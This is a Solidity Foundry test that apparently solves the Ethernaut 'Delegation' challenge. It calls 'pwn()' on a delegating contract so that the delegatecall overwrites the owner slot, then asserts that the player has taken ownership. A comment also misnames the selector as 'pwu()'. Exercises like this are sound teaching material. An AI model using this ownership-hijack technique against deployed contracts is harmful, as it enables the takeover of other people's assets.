// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Delegate, Delegation} from "../src/Delegation.sol";

contract DelegationExploitTest is Test {
    Delegate public delegate;
    Delegation public delegation;

    address player = makeAddr("player");

    function setUp() public {
        // 1. Deploy the Delegate contract first, setting some initial owner
        delegate = new Delegate(address(1));

        // 2. Deploy the Delegation contract, passing the Delegate's address into it
        delegation = new Delegation(address(delegate));
    }

    function testDelegationExploit() public {
        // 1. Act as the player
        vm.prank(player);

        // 2. Send a low-level call to Delegation with the bytes for "pwu()"
        (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        assertTrue(success, "Call failed");

        // 3. Verify that the player is now the owner of Delegation!
        assertEq(delegation.owner(), player, "Exploit failed: player is not owned");
    }
}
